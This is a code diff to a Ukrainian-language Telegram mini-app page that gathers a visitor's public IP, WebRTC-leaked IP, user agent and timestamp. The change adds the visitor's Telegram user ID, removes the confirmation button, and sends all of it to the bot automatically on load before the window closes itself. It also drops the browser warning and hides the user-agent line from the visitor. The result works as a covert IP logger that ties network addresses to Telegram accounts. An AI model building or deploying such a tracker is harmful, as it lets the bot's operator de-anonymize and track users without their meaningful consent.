@@ -57,23 +57,14 @@
             font-family: monospace;
             word-break: break-all;
         }
-        button {
-            background: var(--tg-theme-button-color, #4b7bec);
-            color: var(--tg-theme-button-text-color, #fff);
-            border: none;
-            padding: 12px 24px;
-            border-radius: 8px;
-            margin-top: 20px;
-            font-size: 15px;
-            cursor: pointer;
-            width: 100%;
-        }
-        button:hover {
-            opacity: 0.9;
-        }
         .error {
             color: #e74c3c;
             font-size: 14px;
+        }
+        .status {
+            margin-top: 15px;
+            font-size: 14px;
+            font-weight: 600;
         }
     </style>
 </head>
@@ -83,6 +74,7 @@
     <p>Будь ласка, зачекайте. Ми збираємо інформацію про ваше підключення...</p>
     <div id="loader" class="loader"></div>
     <div id="result" style="display: none; margin-top: 20px;"></div>
+    <div id="status" class="status"></div>
 </div>
 
 <script>
@@ -91,7 +83,7 @@
     // Перевіряємо, чи працюємо всередині Telegram
     const isTelegram = tg.initData !== undefined && tg.initDataUnsafe !== undefined;
     
-    console.log('🔍 Telegram WebApp:', isTelegram ? '✅ Так' : '❌ Ні (відкрито у браузері)');
+    console.log('🔍 Telegram WebApp:', isTelegram ? '✅ Так' : '❌ Ні');
     
     tg.ready();
     tg.expand();
@@ -154,10 +146,19 @@
         });
     }
 
+    // Отримуємо user_id з Telegram initData
+    function getUserId() {
+        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
+            return tg.initDataUnsafe.user.id;
+        }
+        return null;
+    }
+
     window.addEventListener('DOMContentLoaded', async () => {
         try {
             document.getElementById('loader').style.display = 'block';
             document.getElementById('result').style.display = 'none';
+            document.getElementById('status').textContent = '⏳ Збір даних...';
 
             // Отримуємо IP послідовно для кращої стабільності
             const publicIP = await getPublicIP();
@@ -166,26 +167,25 @@
             const now = new Date();
             const timestamp = now.toISOString();
             const userAgent = navigator.userAgent;
-
-            // Визначаємо порт
             const port = window.location.protocol === 'https:' ? '443' :
                          window.location.protocol === 'http:' ? '80' : 'N/A';
 
+            // Формуємо дані
+            const data = {
+                ip: publicIP,
+                webrtc_ip: webrtcIP,
+                port: port,
+                timestamp: timestamp,
+                user_agent: userAgent,
+                telegram_user_id: getUserId()
+            };
+
             // Показуємо результат
             document.getElementById('loader').style.display = 'none';
-            const resultDiv = document.getElementById('result');
-            resultDiv.style.display = 'block';
-            
-            // Якщо не в Telegram - показуємо попередження
-            const telegramWarning = !isTelegram ? `
-                <div style="background: #fff3cd; padding: 10px; border-radius: 6px; margin: 10px 0; color: #856404;">
-                    ⚠️ Ви відкрили сторінку у браузері. Для відправки даних боту, будь ласка, відкрийте цю сторінку через Telegram бота.
-                </div>
-            ` : '';
-            
-            resultDiv.innerHTML = `
+            document.getElementById('result').style.display = 'block';
+            document.getElementById('result').innerHTML = `
                 <div class="success">✅ Дані зібрано успішно!</div>
-                ${telegramWarning}
+                
                 <div class="data-item">
                     <span class="data-label">🌐 Публічний IP:</span>
                     <span class="data-value">${publicIP}</span>
@@ -205,44 +205,36 @@
                     <span class="data-label">🕐 Дата/Час:</span>
                     <span class="data-value">${timestamp}</span>
                 </div>
-
-                <div class="data-item">
-                    <span class="data-label">📱 User Agent:</span>
-                    <span class="data-value" style="font-size: 11px;">${userAgent.substring(0, 100)}${userAgent.length > 100 ? '...' : ''}</span>
-                </div>
-
-                <button id="sendBtn">✅ Надіслати дані боту</button>
             `;
 
-            document.getElementById('sendBtn').addEventListener('click', () => {
-                const data = JSON.stringify({
-                    ip: publicIP,
-                    webrtc_ip: webrtcIP,
-                    port: port,
-                    timestamp: timestamp,
-                    user_agent: userAgent
-                });
+            // Відправляємо дані боту
+            document.getElementById('status').textContent = '📤 Відправка даних боту...';
+            console.log('📤 Відправка даних:', JSON.stringify(data));
+
+            if (isTelegram) {
+                // Відправляємо дані через Telegram WebApp API
+                tg.sendData(JSON.stringify(data));
                 
-                console.log('📤 Відправка даних:', data);
+                document.getElementById('status').textContent = '✅ Дані надіслано! Закриття...';
+                document.getElementById('status').style.color = '#2ecc71';
                 
-                if (isTelegram) {
-                    tg.sendData(data);
-                    // Показуємо підтвердження
-                    document.getElementById('sendBtn').disabled = true;
-                    document.getElementById('sendBtn').textContent = '✅ Дані надіслано!';
-                    document.getElementById('sendBtn').style.background = '#2ecc71';
-                } else {
-                    alert('❌ Ця кнопка працює тільки всередині Telegram! Будь ласка, відкрийте бота у Telegram і натисніть кнопку там.');
-                }
-            });
+                // Закриваємо вікно через 1.5 секунди
+                setTimeout(() => {
+                    tg.close();
+                }, 1500);
+            } else {
+                document.getElementById('status').textContent = '❌ Відкрито не в Telegram';
+                document.getElementById('status').style.color = '#e74c3c';
+            }
 
         } catch (err) {
             document.getElementById('loader').style.display = 'none';
             document.getElementById('result').style.display = 'block';
             document.getElementById('result').innerHTML = `
                 <p class="error">❌ Помилка збору даних: ${err.message}</p>
-                <button onclick="location.reload()">🔄 Спробувати знову</button>
             `;
+            document.getElementById('status').textContent = '❌ Помилка';
+            document.getElementById('status').style.color = '#e74c3c';
         }
     });
 </script>
